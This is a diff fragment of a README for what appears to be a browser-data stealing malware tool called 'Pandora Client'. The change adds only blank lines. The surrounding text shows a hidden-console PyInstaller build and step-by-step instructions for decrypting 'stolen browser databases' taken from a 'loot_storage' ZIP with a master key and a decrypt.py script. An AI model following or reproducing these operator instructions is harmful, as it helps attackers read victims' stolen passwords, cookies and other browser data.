@@ -99,8 +99,12 @@ python -m PyInstaller --noconsole --onefile --icon=ICON.ico --name "Pandora Clie
 
 ## 4. Decryption
 ​The stolen browser databases are encrypted. To read them:
+
 4.1. ​Extract the .db file and the .key file from the received ZIP in loot_storage.
+
 ​4.2. Open decrypt.py.
+
 ​4.3. Paste the Master Key into MASTER_KEY_BASE64 and set the DB_FILE path.
+
 ​4.4. Run: python decrypt.py
 
